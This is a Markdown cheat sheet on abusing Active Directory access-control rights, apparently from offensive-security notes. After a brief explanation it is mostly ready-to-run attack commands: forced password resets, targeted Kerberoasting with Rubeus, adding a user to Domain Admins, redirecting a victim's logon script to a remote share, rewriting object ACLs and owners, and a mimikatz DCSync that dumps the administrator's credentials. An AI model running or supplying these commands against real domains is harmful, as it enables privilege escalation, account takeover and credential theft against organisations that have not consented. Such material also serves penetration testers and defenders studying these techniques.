title: ACL Abuse
---

Access Control Lists (ACLs) are an essential part of Windows Active Directory security. They are used to control access to resources such as files, folders, and network shares. However, ACLs can be abused by attackers to gain unauthorized access to sensitive data.

One common ACL abuse technique is known as "over-permissioning." This occurs when an administrator grants more permissions than necessary to a user or group. For example, granting "Full Control" to a user who only needs "Read" access. This can lead to unintended consequences, such as data leaks or unauthorized modifications.

## GenericAll / GenericWrite / WriteProperty

### On a User
1. **Change Password**
    ```bash
    net user <username> <password> /domain
    ```
2. **Targeted Kerberoasting**
    1. Set a fake Service Principal Name (SPN):
        ```powershell
        Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
        ```
    2. Obtain the hash:
        ```powershell
        .\Rubeus.exe kerberoast /user:<username> /nowrap
        ```
    3. Clear the SPN:
        ```powershell
        Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
        ```
3. **Disable Preauthentication**
    ```powershell
    Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
    ```

### On a Group
1. **Add to Group**
    - Using `net`:
        ```bash
        net group "domain admins" spotless/add /domain
        ```
    - Using Active Directory module:
        ```powershell
        Add-ADGroupMember -Identity "domain admins" -Members spotless
        ```
    - Using PowerSploit:
        ```powershell
        Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
        ```

### On a Computer
- **Resource-Based Constrained Delegation (RBCD)**

## Special Rights Abuse

1. GenericWrite on User
- Overwrite logon script path for the target user:
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
2. AllExtendedRights
- Change Password
```bash
net user <username> <password> /domain
```
- Add to Group
```bash
net group "domain admins" spotless/add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
3. Self-Membership (Add to Group)
```bash
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
4. ExtendedRight (User-Force-Change-Password (Password Reset))
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
```
5. WriteProperty (Add to Group)
```bash
Add-ADGroupMember -Identity MachineAdmins -Members $otherDomainUser
```
6. WriteOwner (Change the objectâ€™s owner)
```bash
Set-DomainObjectOwner -Identity testuser -Domain techcorp.local -OwnerIdentity "us\studentuser19"
Get-ADObject -Identity "CN=Users,DC=contoso,DC=com" -Properties Owner | Select-Object -ExpandProperty Owner
```
7. WriteDACL (Grant Generic Permissions** (must be the owner))
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local" 
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
8. DCSync Attack 
- The user running the command must have Replicating Directory Changes permissions in Active Directory. This is typically assigned to domain admins or equivalent privileged accounts.
```bash
lsadump::dcsync /domain:<Domain> /user:<User>
lsadump::dcsync /domain:example.com /user:administrator
```
